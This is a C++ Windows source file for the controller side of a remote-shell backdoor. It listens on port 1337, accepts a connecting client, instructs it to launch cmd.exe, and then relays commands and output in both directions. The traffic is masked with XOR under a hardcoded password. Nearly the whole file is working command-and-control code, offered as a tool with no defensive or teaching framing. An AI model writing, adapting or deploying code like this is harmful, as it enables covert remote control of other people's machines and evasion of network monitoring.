#include<ws2tcpip.h>
#include<winsock2.h>
#include<windows.h>
#include<iostream>
#include<thread>
#include<string>
#include<cstring>

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

class Server{
	private:
		SOCKET sckMainSocket = INVALID_SOCKET;
		int iLocalPort;
		std::string strPassword = "";
	public:
		Server() : iLocalPort(1337), strPassword("password") {}
		Server(int iPort) : iLocalPort(iPort), strPassword("password") {}
		Server(std::string strPass) : iLocalPort(1337), strPassword(strPass) {}
		Server(int iPort, std::string strPass) : iLocalPort(iPort), strPassword(strPass) {}

		bool isShellRunning = false;
		
		SOCKET sckInit();
		SOCKET WaitConnection();
		void SpawnShell(const char*, SOCKET);
		std::string Xor(const std::string);
		
		void threadReceiveRemoteOutput(SOCKET);
};

void Server::SpawnShell(const char* cCmdLine, SOCKET iClientSck){
	std::string strCommandLine = "xx";
	strCommandLine.append(cCmdLine);
	std::string strOut = Xor(strCommandLine);
	int iLen = strOut.length();
	if(send(iClientSck, strOut.c_str(), iLen, 0) <= 0){
		std::cout<<"Unable to send command to client\n";
		return;
	}
	//Wait client confirmation
	char cCmdBuffer[5];
	memset(cCmdBuffer, 0, 5);
	if(recv(iClientSck, cCmdBuffer, 4, 0) <= 0){
		std::cout<<"Unable to receive response from client\n";
		return;
	}
	strCommandLine = Xor(std::string(cCmdBuffer));
	if(strCommandLine[0] == 'x' && strCommandLine[1] == 'x' && strCommandLine[2] == '1'){
		//Confirmed
		isShellRunning = true;
		std::thread th1(&Server::threadReceiveRemoteOutput, this, iClientSck);
		char cCmdLine[1024];
		std::string strInput = "";
		while(isShellRunning){
			memset(cCmdLine, 0, 1024);
			fgets(cCmdLine, 1024, stdin);
			strInput = Xor(std::string(cCmdLine));
			iLen = strInput.length();
			if(send(iClientSck, strInput.c_str(), iLen, 0) <= 0){
				isShellRunning = false;
				std::cout<<"Unable to send command to client\n";
				break;
			}
		}
		th1.join();
	} else {
		std::cout<<"Unable to spawn remote shell\n";
		return;
	}
	
}

std::string Server::Xor(const std::string strMessage){
	std::string strFinal = "";
	for(char mC : strMessage){
		for(char xC : strPassword){
			mC ^= xC;
		}
		strFinal.append(1, mC);
	}
	return strFinal;
}

void Server::threadReceiveRemoteOutput(SOCKET iSocket){
	char cCmdBuffer[1025];
	int iBytes = 0;
	while(isShellRunning){
		iBytes = recv(iSocket, cCmdBuffer, 1024, 0);
		if(iBytes > 0){
			cCmdBuffer[iBytes] = '\0';
			std::string strOutput = Xor(std::string(cCmdBuffer));
			std::cout<<strOutput;
		} else if(iBytes == -1){
			std::cout<<"Socket error\n";
			break;
		}
	}
}

SOCKET Server::WaitConnection(){
	char strIP[INET6_ADDRSTRLEN];
	SOCKET sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != INVALID_SOCKET){
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
		std::cout<<"Nueva conexion desde "<<strIP<<'\n';
	}
	return sckTmpSocket;
}

SOCKET Server::sckInit(){
	int iYes = 1;
	sckMainSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&iYes, sizeof(int)) == -1){
		std::cout<<"setsockopt error\n";
		return INVALID_SOCKET;
	}
	struct sockaddr_in Serv;
	Serv.sin_family = AF_INET;
    Serv.sin_port = htons(iLocalPort);
    Serv.sin_addr.s_addr = INADDR_ANY;
    if(bind(sckMainSocket, (struct sockaddr *)&Serv, sizeof(struct sockaddr)) == -1){
         return INVALID_SOCKET;                           
    }
	if(listen(sckMainSocket, 1) == -1){
		std::cout<<"Error escuchando por el puerto especificado\n";
		return INVALID_SOCKET;
	}
	if(sckMainSocket == INVALID_SOCKET){
		return INVALID_SOCKET;
	}
	return sckMainSocket;
}

int main(){
	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
	   std::cout<<"WSAStartup error: "<<WSAGetLastError()<<"\n";
	   return 0;
	}
	Server *Srv = new Server(1337, "$up3rP@sSw0rD");
	if(Srv->sckInit() != INVALID_SOCKET){
		std::cout<<"Esperando a cliente...\n";
		int sckTmp = Srv->WaitConnection();
		if(sckTmp != -1){
			Srv->SpawnShell("cmd.exe", sckTmp);
		}
	}
	delete Srv;
	Srv = nullptr;
	WSACleanup();
	return 0;
}
